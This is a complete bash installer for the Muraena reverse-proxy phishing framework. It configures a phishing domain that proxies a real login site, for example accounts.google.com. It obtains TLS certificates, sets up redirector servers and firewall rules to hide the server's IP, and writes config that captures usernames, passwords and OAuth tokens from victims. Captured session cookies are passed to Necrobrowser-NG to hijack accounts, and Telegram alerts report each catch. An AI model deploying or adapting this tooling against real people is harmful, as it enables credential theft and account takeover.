#!/usr/bin/env bash
set -euo pipefail

# ─────────────────────────────────────────────────────────────────────────────
# Muraena — plug-and-play setup script
#
# Interactive:       ./setup.sh
# Non-interactive:   ./setup.sh --ci   (reads from environment variables)
#
# CI environment variables:
#   MURAENA_PHISHING_DOMAIN     required  your phishing domain
#   MURAENA_TARGET_DOMAIN       required  domain to proxy
#   MURAENA_TLS_MODE            1=letsencrypt-http  2=letsencrypt-dns  3=self-signed  4=none
#   MURAENA_DNS_PROVIDER        cloudflare|route53|manual (required when TLS_MODE=2)
#   MURAENA_CF_API_TOKEN        Cloudflare API token (when DNS_PROVIDER=cloudflare)
#   MURAENA_TRACKING            true/false (default: true)
#   MURAENA_TOKEN_CAPTURE       true/false — OAuth/bearer token capture (default: false)
#   MURAENA_SESSION_MODE        1=store-only  2=necro-docker  3=necro-external
#   MURAENA_NECRO_ENDPOINT      required when SESSION_MODE=3
#   MURAENA_NECRO_COOKIES       comma-separated trigger cookie names
#   MURAENA_NECRO_TASK_TYPE     office365|github|generic (default: generic)
#   MURAENA_REDIRECTOR_IP       optional — redirector VPS IP (hides Muraena's real IP)
#   MURAENA_REDIRECTOR_TYPE     nginx|socat (default: nginx)
#   MURAENA_TELEGRAM_TOKEN      optional
#   MURAENA_TELEGRAM_CHAT_ID    optional
# ─────────────────────────────────────────────────────────────────────────────

CI_MODE=false
[[ "${1:-}" == "--ci" ]] && CI_MODE=true

BOLD="\033[1m"
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
CYAN="\033[36m"
RESET="\033[0m"

info()    { echo -e "${GREEN}[+]${RESET} $*"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $*"; }
error()   { echo -e "${RED}[✗]${RESET} $*"; exit 1; }
section() { echo -e "\n${BOLD}${CYAN}── $* ──${RESET}"; }
ask()     { echo -ne "${BOLD}$1${RESET} "; }

# ── root check ────────────────────────────────────────────────────────────────

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (or with sudo).\n  sudo bash setup.sh"
    fi
}

# ── prerequisites ─────────────────────────────────────────────────────────────

check_deps() {
    local missing=()
    for cmd in docker git openssl curl; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    [[ ${#missing[@]} -gt 0 ]] && error "Missing required tools: ${missing[*]}\nInstall them and re-run."

    if ! docker compose version &>/dev/null; then
        error "Docker Compose v2 not found. Install Docker Desktop or the compose plugin."
    fi
    info "Prerequisites OK."
}

# ── detect public IP ──────────────────────────────────────────────────────────

get_public_ip() {
    curl -s4 --max-time 5 https://ifconfig.me 2>/dev/null \
    || curl -s4 --max-time 5 https://api.ipify.org 2>/dev/null \
    || curl -s4 --max-time 5 https://icanhazip.com 2>/dev/null \
    || echo "unknown"
}

# ── DNS check ────────────────────────────────────────────────────────────────

check_dns() {
    local domain="$1"
    local server_ip
    server_ip=$(get_public_ip)

    info "Server public IP: ${server_ip}"

    local resolved
    resolved=$(dig +short "$domain" A 2>/dev/null | tail -1 || true)
    resolved="${resolved:-$(host "$domain" 2>/dev/null | awk '/has address/{print $NF}' | head -1 || true)}"

    if [[ -z "$resolved" ]]; then
        warn "Cannot resolve ${domain} — DNS not set up yet?"
        warn "Let's Encrypt will FAIL until the domain points at this server."
        [[ "$CI_MODE" == true ]] && return
        ask "Continue anyway? [y/N]:"
        read -r ans; [[ "$ans" =~ ^[Yy]$ ]] || exit 0
    elif [[ "$resolved" != "$server_ip" && "$server_ip" != "unknown" ]]; then
        warn "${domain} resolves to ${resolved}, but this server is ${server_ip}."
        warn "If you are using a redirector this is expected. Otherwise update DNS."
        [[ "$CI_MODE" == true ]] && return
        ask "Continue anyway? [y/N]:"
        read -r ans; [[ "$ans" =~ ^[Yy]$ ]] || exit 0
    else
        info "${domain} → ${resolved} ✓"
    fi
}

# ── firewall ──────────────────────────────────────────────────────────────────

setup_firewall() {
    local redirector_ip="${1:-}"

    section "Firewall"

    if command -v ufw &>/dev/null; then
        info "Configuring ufw..."
        ufw --force enable &>/dev/null || true

        if [[ -n "$redirector_ip" ]]; then
            # Redirector mode: only accept 80/443 from redirector IP
            ufw delete allow 80/tcp  &>/dev/null || true
            ufw delete allow 443/tcp &>/dev/null || true
            ufw allow from "$redirector_ip" to any port 80  proto tcp
            ufw allow from "$redirector_ip" to any port 443 proto tcp
            info "ufw: ports 80/443 restricted to redirector ${redirector_ip}"
        else
            ufw allow 80/tcp
            ufw allow 443/tcp
            info "ufw: ports 80 and 443 opened."
        fi
        ufw allow 22/tcp &>/dev/null || true  # always keep SSH open
        ufw reload &>/dev/null || true

    elif command -v firewall-cmd &>/dev/null; then
        info "Configuring firewalld..."
        systemctl start firewalld &>/dev/null || true
        if [[ -n "$redirector_ip" ]]; then
            firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${redirector_ip} port port=80  protocol=tcp accept"
            firewall-cmd --permanent --add-rich-rule="rule family=ipv4 source address=${redirector_ip} port port=443 protocol=tcp accept"
            info "firewalld: ports 80/443 restricted to redirector ${redirector_ip}"
        else
            firewall-cmd --permanent --add-service=http
            firewall-cmd --permanent --add-service=https
            info "firewalld: http/https services opened."
        fi
        firewall-cmd --reload

    elif command -v iptables &>/dev/null; then
        info "Configuring iptables..."
        if [[ -n "$redirector_ip" ]]; then
            iptables -C INPUT -s "$redirector_ip" -p tcp --dport 80  -j ACCEPT 2>/dev/null \
                || iptables -I INPUT -s "$redirector_ip" -p tcp --dport 80  -j ACCEPT
            iptables -C INPUT -s "$redirector_ip" -p tcp --dport 443 -j ACCEPT 2>/dev/null \
                || iptables -I INPUT -s "$redirector_ip" -p tcp --dport 443 -j ACCEPT
            # Block 80/443 from all other sources
            iptables -C INPUT -p tcp --dport 80  -j DROP 2>/dev/null || iptables -A INPUT -p tcp --dport 80  -j DROP
            iptables -C INPUT -p tcp --dport 443 -j DROP 2>/dev/null || iptables -A INPUT -p tcp --dport 443 -j DROP
            info "iptables: ports 80/443 restricted to redirector ${redirector_ip}"
        else
            iptables -C INPUT -p tcp --dport 80  -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 80  -j ACCEPT
            iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 443 -j ACCEPT
            info "iptables: ports 80 and 443 opened."
        fi
        # Persist rules
        command -v netfilter-persistent &>/dev/null && netfilter-persistent save &>/dev/null || true
        command -v iptables-save &>/dev/null        && iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
    else
        warn "No firewall tool found (ufw/firewalld/iptables). Configure manually."
    fi
}

# ── install certbot ───────────────────────────────────────────────────────────

install_certbot() {
    command -v certbot &>/dev/null && return
    info "Installing certbot..."
    if command -v apt-get &>/dev/null; then
        apt-get update -qq
        apt-get install -y -qq certbot python3-certbot-nginx
        # DNS plugins
        apt-get install -y -qq python3-certbot-dns-cloudflare python3-certbot-dns-route53 2>/dev/null || true
    elif command -v yum &>/dev/null; then
        yum install -y -q certbot python3-certbot-nginx
        yum install -y -q python3-certbot-dns-cloudflare 2>/dev/null || true
    elif command -v dnf &>/dev/null; then
        dnf install -y -q certbot python3-certbot-nginx
        dnf install -y -q python3-certbot-dns-cloudflare 2>/dev/null || true
    elif command -v apk &>/dev/null; then
        apk add --quiet certbot certbot-nginx
    elif command -v brew &>/dev/null; then
        brew install certbot &>/dev/null
    elif command -v snap &>/dev/null; then
        snap install --classic certbot && ln -sf /snap/bin/certbot /usr/bin/certbot
    else
        error "Cannot install certbot — no supported package manager found.\nInstall it manually: https://certbot.eff.org"
    fi
    info "certbot installed: $(certbot --version 2>&1)"
}

# ── TLS: Let's Encrypt HTTP-01 ────────────────────────────────────────────────

setup_tls_letsencrypt_http() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    install_certbot

    # certbot standalone needs port 80 free — stop Docker first
    info "Stopping Docker containers temporarily (certbot needs port 80)..."
    docker compose down 2>/dev/null || true

    info "Requesting certificate for ${PHISHING_DOMAIN} (HTTP-01)..."
    certbot certonly \
        --standalone \
        --non-interactive \
        --agree-tos \
        --register-unsafely-without-email \
        -d "$PHISHING_DOMAIN"

    _copy_letsencrypt_certs
    _setup_cert_renewal
}

# ── TLS: Let's Encrypt DNS-01 ─────────────────────────────────────────────────

setup_tls_letsencrypt_dns() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    install_certbot

    case "${DNS_PROVIDER:-manual}" in
        cloudflare)
            local cf_ini="/tmp/cloudflare.ini"
            cat > "$cf_ini" <<EOF
dns_cloudflare_api_token = ${CF_API_TOKEN}
EOF
            chmod 600 "$cf_ini"
            info "Requesting certificate for ${PHISHING_DOMAIN} (DNS-01 via Cloudflare)..."
            certbot certonly \
                --dns-cloudflare \
                --dns-cloudflare-credentials "$cf_ini" \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            rm -f "$cf_ini"
            ;;
        route53)
            info "Requesting certificate for ${PHISHING_DOMAIN} (DNS-01 via Route53)..."
            certbot certonly \
                --dns-route53 \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            ;;
        manual|*)
            warn "Manual DNS-01 challenge — you will need to add a TXT record to your DNS."
            certbot certonly \
                --manual \
                --preferred-challenges dns \
                --agree-tos \
                --register-unsafely-without-email \
                -d "$PHISHING_DOMAIN"
            ;;
    esac

    _copy_letsencrypt_certs
    _setup_cert_renewal
}

_copy_letsencrypt_certs() {
    local base="/etc/letsencrypt/live/${PHISHING_DOMAIN}"
    cp "${base}/cert.pem"      config/cert.pem
    cp "${base}/privkey.pem"   config/privkey.pem
    cp "${base}/fullchain.pem" config/fullchain.pem
    info "Certificates saved to config/"
}

_setup_cert_renewal() {
    local renew_script="/etc/cron.d/muraena-certbot-renew"
    local repo_dir
    repo_dir="$(pwd)"

    cat > "$renew_script" <<CRON
# Muraena — Let's Encrypt auto-renewal (twice daily, as recommended)
0 3,15 * * * root certbot renew --quiet --deploy-hook "cp /etc/letsencrypt/live/${PHISHING_DOMAIN}/cert.pem ${repo_dir}/config/cert.pem && cp /etc/letsencrypt/live/${PHISHING_DOMAIN}/privkey.pem ${repo_dir}/config/privkey.pem && cp /etc/letsencrypt/live/${PHISHING_DOMAIN}/fullchain.pem ${repo_dir}/config/fullchain.pem && docker compose -f ${repo_dir}/docker-compose.yml restart muraena"
CRON
    chmod 644 "$renew_script"
    info "Auto-renewal cron installed → ${renew_script}"
    info "Certs will renew automatically every 60 days and Muraena will restart."
}

setup_tls_selfsigned() {
    if [[ -f config/cert.pem && -f config/privkey.pem ]]; then
        info "Certificates already present — skipping."
        return
    fi
    info "Generating self-signed certificate for ${PHISHING_DOMAIN}..."
    openssl req -x509 -newkey rsa:4096 -sha256 -days 825 -nodes \
        -keyout config/privkey.pem \
        -out    config/cert.pem \
        -subj   "/CN=${PHISHING_DOMAIN}" \
        -addext "subjectAltName=DNS:${PHISHING_DOMAIN}" 2>/dev/null
    cp config/cert.pem config/fullchain.pem
    warn "Self-signed cert generated — browsers will show a security warning."
}

# ── redirector setup ──────────────────────────────────────────────────────────

setup_redirector() {
    local redirector_ip="$1"
    local redirector_type="${2:-nginx}"
    local muraena_ip
    muraena_ip=$(get_public_ip)

    section "Redirector Configuration"
    info "Muraena IP (keep this SECRET): ${muraena_ip}"
    info "Redirector IP (goes in DNS):   ${redirector_ip}"

    mkdir -p config/redirector

    case "$redirector_type" in
        nginx)
            cat > config/redirector/nginx.conf <<NGINX
# ── Muraena Redirector — nginx stream (TCP pass-through) ──
# Deploy this on your redirector VPS (NOT the Muraena server).
# DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}
#
# Install:  apt-get install -y nginx
# Place at: /etc/nginx/nginx.conf  (or include from /etc/nginx/conf.d/)
# Enable:   systemctl restart nginx

stream {
    # Forward all HTTPS traffic transparently to Muraena
    server {
        listen     443;
        proxy_pass ${muraena_ip}:443;
        proxy_timeout 600s;
        proxy_connect_timeout 10s;
    }

    # Forward HTTP (used for HTTPS redirect + certbot HTTP-01 if needed)
    server {
        listen     80;
        proxy_pass ${muraena_ip}:80;
        proxy_timeout 60s;
    }
}
NGINX

            cat > config/redirector/setup-redirector.sh <<'RSETUP'
#!/usr/bin/env bash
# Run this script ON YOUR REDIRECTOR VPS to install nginx as a TCP forwarder.
set -euo pipefail
apt-get update -qq && apt-get install -y -qq nginx
cp /dev/stdin /etc/nginx/nginx.conf << 'EOF'
NGINXCONF
EOF
nginx -t && systemctl restart nginx && systemctl enable nginx
echo "[+] Redirector nginx started."
RSETUP
            # Inject the actual nginx.conf into the setup script
            sed -i "s|NGINXCONF|$(cat config/redirector/nginx.conf | sed 's/[&/\]/\\&/g' | tr '\n' '~' | sed 's/~/\\n/g')|" \
                config/redirector/setup-redirector.sh 2>/dev/null || true
            chmod +x config/redirector/setup-redirector.sh
            ;;

        socat)
            cat > config/redirector/socat-redirector.sh <<SOCAT
#!/usr/bin/env bash
# Run this ON YOUR REDIRECTOR VPS to forward traffic to Muraena.
# DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}
set -euo pipefail

MURAENA_IP="${muraena_ip}"

apt-get install -y -qq socat 2>/dev/null || yum install -y socat 2>/dev/null || true

# Run as background daemons
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:\${MURAENA_IP}:443 &
socat TCP4-LISTEN:80,fork,reuseaddr  TCP4:\${MURAENA_IP}:80  &

echo "[+] socat forwarders running (PID \$!)"
echo "    443 → \${MURAENA_IP}:443"
echo "     80 → \${MURAENA_IP}:80"
SOCAT
            chmod +x config/redirector/socat-redirector.sh
            ;;
    esac

    info "Redirector configs written to config/redirector/"
    info "  Copy and run on your redirector VPS:"
    case "$redirector_type" in
        nginx) info "  → config/redirector/nginx.conf" ;;
        socat) info "  → config/redirector/socat-redirector.sh" ;;
    esac
    echo ""
    warn "OPSEC checklist:"
    warn "  1. DNS A record for ${PHISHING_DOMAIN} → ${redirector_ip}  (NOT ${muraena_ip})"
    warn "  2. Muraena firewall allows 80/443 only from ${redirector_ip}"
    warn "  3. Never expose Muraena's IP in emails, certificates, or logs"
    warn "  4. Use DNS-01 challenge for Let's Encrypt (avoids port 80 exposure)"
}

# ── gather config ─────────────────────────────────────────────────────────────

gather_config() {
    if [[ "$CI_MODE" == true ]]; then
        PHISHING_DOMAIN="${MURAENA_PHISHING_DOMAIN:?MURAENA_PHISHING_DOMAIN must be set}"
        TARGET_DOMAIN="${MURAENA_TARGET_DOMAIN:?MURAENA_TARGET_DOMAIN must be set}"
        TLS_CHOICE="${MURAENA_TLS_MODE:-4}"
        DNS_PROVIDER="${MURAENA_DNS_PROVIDER:-manual}"
        CF_API_TOKEN="${MURAENA_CF_API_TOKEN:-}"
        TRACKING_CHOICE="${MURAENA_TRACKING:-Y}"
        TOKEN_CAPTURE="${MURAENA_TOKEN_CAPTURE:-N}"
        SESSION_MODE="${MURAENA_SESSION_MODE:-1}"
        NECRO_COOKIES="${MURAENA_NECRO_COOKIES:-sessionToken}"
        NECRO_TASK_TYPE="${MURAENA_NECRO_TASK_TYPE:-generic}"
        REDIRECTOR_IP="${MURAENA_REDIRECTOR_IP:-}"
        REDIRECTOR_TYPE="${MURAENA_REDIRECTOR_TYPE:-nginx}"
        TG_TOKEN="${MURAENA_TELEGRAM_TOKEN:-}"
        TG_CHAT_ID="${MURAENA_TELEGRAM_CHAT_ID:-}"
        TG_CHOICE="N"
        [[ -n "$TG_TOKEN" && -n "$TG_CHAT_ID" ]] && TG_CHOICE="Y"
        NECRO_ENDPOINT=""
        [[ "$SESSION_MODE" == "2" ]] && NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        [[ "$SESSION_MODE" == "3" ]] && NECRO_ENDPOINT="${MURAENA_NECRO_ENDPOINT:?MURAENA_NECRO_ENDPOINT must be set when SESSION_MODE=3}"
        info "CI mode — config loaded."
        info "  Domain   : ${PHISHING_DOMAIN} → ${TARGET_DOMAIN}"
        info "  TLS      : ${TLS_CHOICE}"
        info "  Sessions : ${SESSION_MODE}"
        [[ -n "$REDIRECTOR_IP" ]] && info "  Redirector: ${REDIRECTOR_IP} (${REDIRECTOR_TYPE})"
        return
    fi

    # ── interactive ───────────────────────────────────────────────────────────
    section "Core Configuration"
    ask "Phishing domain (e.g. evil.example.com):"
    read -r PHISHING_DOMAIN
    [[ -z "$PHISHING_DOMAIN" ]] && error "Phishing domain is required."

    ask "Target domain to proxy (e.g. accounts.google.com):"
    read -r TARGET_DOMAIN
    [[ -z "$TARGET_DOMAIN" ]] && error "Target domain is required."

    section "Opsec — Redirector"
    echo "  A redirector sits in front of Muraena, hiding this server's real IP."
    echo "  DNS points to the redirector. If it gets burned, spin up a new one."
    echo ""
    ask "Use a redirector VPS? [y/N]:"
    read -r REDIR_CHOICE
    REDIRECTOR_IP=""
    REDIRECTOR_TYPE="nginx"
    if [[ "${REDIR_CHOICE:-N}" =~ ^[Yy]$ ]]; then
        ask "Redirector VPS IP address:"
        read -r REDIRECTOR_IP
        [[ -z "$REDIRECTOR_IP" ]] && error "Redirector IP is required."
        echo "  1) nginx  (TCP stream proxy — recommended)"
        echo "  2) socat  (simple port forwarder)"
        ask "Redirector type [1/2]:"
        read -r rt
        [[ "${rt:-1}" == "2" ]] && REDIRECTOR_TYPE="socat" || REDIRECTOR_TYPE="nginx"
    fi

    section "TLS / HTTPS"
    if [[ -n "$REDIRECTOR_IP" ]]; then
        echo "  Note: with a redirector, DNS-01 is recommended (no port 80 needed)."
        echo ""
    fi
    echo "  1) Let's Encrypt — HTTP-01  (needs port 80 open, no redirector)"
    echo "  2) Let's Encrypt — DNS-01   (needs DNS API or manual TXT record)"
    echo "  3) Self-signed              (testing / LAN)"
    echo "  4) None                     (plain HTTP, port 8080)"
    ask "Choose [1/2/3/4]:"
    read -r TLS_CHOICE
    TLS_CHOICE="${TLS_CHOICE:-4}"
    DNS_PROVIDER="manual"
    CF_API_TOKEN=""
    if [[ "$TLS_CHOICE" == "2" ]]; then
        echo "  DNS provider:"
        echo "  1) Cloudflare (automatic)"
        echo "  2) Route53    (automatic — needs AWS credentials in env)"
        echo "  3) Manual     (you add the TXT record yourself)"
        ask "Choose [1/2/3]:"
        read -r dp
        case "${dp:-3}" in
            1) DNS_PROVIDER="cloudflare"
               ask "Cloudflare API token:"
               read -r CF_API_TOKEN ;;
            2) DNS_PROVIDER="route53" ;;
            *) DNS_PROVIDER="manual"  ;;
        esac
    fi

    section "Tracking"
    ask "Enable victim tracking? [Y/n]:"
    read -r TRACKING_CHOICE
    TRACKING_CHOICE="${TRACKING_CHOICE:-Y}"

    ask "Enable OAuth/bearer token capture? [y/N]:"
    read -r TOKEN_CAPTURE
    TOKEN_CAPTURE="${TOKEN_CAPTURE:-N}"

    section "Session Handling"
    echo "  1) Store only     — save to Redis; inspect with redis-cli"
    echo "  2) Store + send   — Redis + Necrobrowser-NG in Docker (auto-cloned)"
    echo "  3) Store + send   — Redis + existing Necrobrowser-NG instance"
    echo ""
    ask "Choose [1/2/3] (default: 1):"
    read -r SESSION_MODE
    SESSION_MODE="${SESSION_MODE:-1}"
    NECRO_ENDPOINT=""
    NECRO_COOKIES="sessionToken"
    NECRO_TASK_TYPE="generic"
    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        if [[ "$SESSION_MODE" == "3" ]]; then
            ask "Necrobrowser-NG endpoint URL:"
            read -r NECRO_ENDPOINT
            [[ -z "$NECRO_ENDPOINT" ]] && error "Endpoint is required."
        else
            NECRO_ENDPOINT="http://necrobrowser:3000/instrument"
        fi
        ask "Trigger cookie name(s) (comma-separated):"
        read -r NECRO_COOKIES
        NECRO_COOKIES="${NECRO_COOKIES:-sessionToken}"
        ask "Task type (office365/github/generic):"
        read -r NECRO_TASK_TYPE
        NECRO_TASK_TYPE="${NECRO_TASK_TYPE:-generic}"
    fi

    section "Telegram Alerts"
    ask "Enable Telegram alerts? [y/N]:"
    read -r TG_CHOICE
    TG_CHOICE="${TG_CHOICE:-N}"
    TG_TOKEN=""
    TG_CHAT_ID=""
    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        ask "Bot token:"
        read -r TG_TOKEN
        ask "Chat ID (e.g. -1001234567890):"
        read -r TG_CHAT_ID
    fi
}

# ── write config.toml ─────────────────────────────────────────────────────────

write_config() {
    local tls_enable="false"
    local port="8080"
    local http_redirect="false"
    case "$TLS_CHOICE" in
        1|2|3) tls_enable="true"; port="443"; http_redirect="true" ;;
    esac

    local tracking_enable="false"
    [[ "$TRACKING_CHOICE" =~ ^[Yy]$ ]] && tracking_enable="true"

    local token_block=""
    if [[ "${TOKEN_CAPTURE:-N}" =~ ^[Yy]$ ]]; then
        token_block='
[tracking.tokens]
    enable        = true
    captureBearer = true
    keys  = ["access_token", "refresh_token", "id_token", "token", "bearer_token"]
    paths = [
        "/oauth/token", "/oauth2/token", "/token",
        "/api/token",   "/connect/token", "/auth/token",
        "/login/oauth/access_token",
    ]'
    fi

    local necro_block=""
    if [[ "$SESSION_MODE" =~ ^[23]$ ]]; then
        IFS=',' read -ra COOKIE_ARR <<< "$NECRO_COOKIES"
        local cookie_toml=""
        for ck in "${COOKIE_ARR[@]}"; do
            ck="$(echo "$ck" | xargs)"
            cookie_toml+="\"${ck}\", "
        done
        cookie_toml="[${cookie_toml%, }]"
        necro_block="
[necrobrowser]
    enable   = true
    endpoint = \"${NECRO_ENDPOINT}\"
    profile  = \"./config/instrument.necro\"

    [necrobrowser.trigger]
        type   = \"cookies\"
        values = ${cookie_toml}
        delay  = 10"
    fi

    local tg_block=""
    if [[ "$TG_CHOICE" =~ ^[Yy]$ ]]; then
        tg_block="
[telegram]
    enable   = true
    botToken = \"${TG_TOKEN}\"
    chatIDs  = [\"${TG_CHAT_ID}\"]"
    fi

    cat > config/config.toml <<TOML
# Generated by setup.sh — $(date -u +"%Y-%m-%d %H:%M UTC")

[proxy]
    phishing    = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    port        = ${port}

    [proxy.HTTPtoHTTPS]
        enable   = ${http_redirect}
        HTTPport = 80

[transform]
    [transform.base64]
        enable  = false
        padding = ["=", "."]
    [transform.response]
        skipContentType = ["font/*", "image/*"]

[log]
    enable = true

[redis]
    host = "redis"
    port = 6379

[tls]
    enable      = ${tls_enable}
    expand      = false
    certificate = "./config/cert.pem"
    key         = "./config/privkey.pem"
    root        = "./config/fullchain.pem"
    minVersion  = "TLS1.2"
    renegotiationSupport = "Never"

[tracking]
    enable             = ${tracking_enable}
    trackRequestCookie = true

    [tracking.trace]
        identifier = "_uid"
        validator  = "[a-zA-Z0-9]{8}"
        header     = "X-Track"
        [tracking.trace.landing]
            type   = "query"
            header = "X-Landing"

[tracking.secrets]
    paths = ["/login", "/signin", "/auth", "/session"]
    [[tracking.secrets.patterns]]
        label = "Username"
        start = "username="
        end   = "&"
    [[tracking.secrets.patterns]]
        label = "Password"
        start = "password="
        end   = "&"
${token_block}
${necro_block}
${tg_block}
TOML
    info "config/config.toml written."
}

# ── write instrument.necro ────────────────────────────────────────────────────

write_necro_profile() {
    local task_type="${NECRO_TASK_TYPE:-generic}"
    cat > config/instrument.necro <<JSON
{
  "name": "%%%TRACKER%%%",
  "task": {
    "type": "${task_type}",
    "name": ["ScreenshotPages"],
    "params": {
      "fixSession": "https://${TARGET_DOMAIN}",
      "credentials": %%%CREDENTIALS%%%,
      "tokens": %%%TOKENS%%%
    }
  },
  "cookies": %%%COOKIES%%%
}
JSON
    info "config/instrument.necro written."
}

# ── docker-compose override for necrobrowser ──────────────────────────────────

write_compose_override() {
    [[ "${SESSION_MODE:-1}" != "2" ]] && return
    info "Cloning Necrobrowser-NG..."
    if [[ ! -d necrobrowser-ng ]]; then
        git clone --depth 1 --quiet https://github.com/muraenateam/necrobrowser.git necrobrowser-ng
    else
        info "necrobrowser-ng/ already present, skipping clone."
    fi
    cat > docker-compose.override.yml <<YML
# Auto-generated by setup.sh
services:
  necrobrowser:
    build: ./necrobrowser-ng
    restart: unless-stopped
    ports:
      - "3000:3000"
    depends_on:
      redis:
        condition: service_healthy
    environment:
      - REDIS_HOST=redis
      - REDIS_PORT=6379
YML
    info "docker-compose.override.yml written."
}

# ── launch ────────────────────────────────────────────────────────────────────

launch() {
    section "Starting Muraena"
    docker compose build 2>&1 | tail -5
    docker compose up -d
    echo ""
    info "Muraena is running!"
    echo ""
    echo -e "  ${BOLD}Phishing domain :${RESET} ${PHISHING_DOMAIN}"
    echo -e "  ${BOLD}Proxying        :${RESET} ${TARGET_DOMAIN}"
    if [[ "$TLS_CHOICE" =~ ^[123]$ ]]; then
        echo -e "  ${BOLD}URL             :${RESET} https://${PHISHING_DOMAIN}"
    else
        echo -e "  ${BOLD}URL             :${RESET} http://${PHISHING_DOMAIN}:8080"
    fi
    case "${SESSION_MODE:-1}" in
        1) echo -e "  ${BOLD}Sessions        :${RESET} Store in Redis only" ;;
        2) echo -e "  ${BOLD}Sessions        :${RESET} Redis + Necrobrowser-NG (Docker)" ;;
        3) echo -e "  ${BOLD}Sessions        :${RESET} Redis + Necrobrowser-NG at ${NECRO_ENDPOINT}" ;;
    esac
    [[ -n "${REDIRECTOR_IP:-}" ]] && \
        echo -e "  ${BOLD}Redirector      :${RESET} ${REDIRECTOR_IP} (${REDIRECTOR_TYPE}) — see config/redirector/"
    echo ""
    echo -e "  ${BOLD}Inspect Redis   :${RESET} docker compose exec redis redis-cli hgetall victim:<ID>"
    echo -e "  ${BOLD}Logs            :${RESET} docker compose logs -f muraena"
    echo -e "  ${BOLD}Stop            :${RESET} docker compose down"
    echo ""
}

# ── main ──────────────────────────────────────────────────────────────────────

main() {
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${CYAN}║     Muraena — Plug & Play Setup      ║${RESET}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════╝${RESET}"
    echo ""

    check_root
    check_deps
    gather_config

    section "DNS Check"
    check_dns "$PHISHING_DOMAIN"

    section "Firewall"
    setup_firewall "${REDIRECTOR_IP:-}"

    section "TLS"
    case "$TLS_CHOICE" in
        1) setup_tls_letsencrypt_http ;;
        2) setup_tls_letsencrypt_dns  ;;
        3) setup_tls_selfsigned       ;;
        *) info "Skipping TLS (HTTP mode)." ;;
    esac

    section "Writing Configuration"
    write_config
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_necro_profile
    [[ "$SESSION_MODE" =~ ^[23]$ ]] && write_compose_override
    [[ -n "${REDIRECTOR_IP:-}" ]]   && setup_redirector "$REDIRECTOR_IP" "${REDIRECTOR_TYPE:-nginx}"

    launch
}

main "$@"
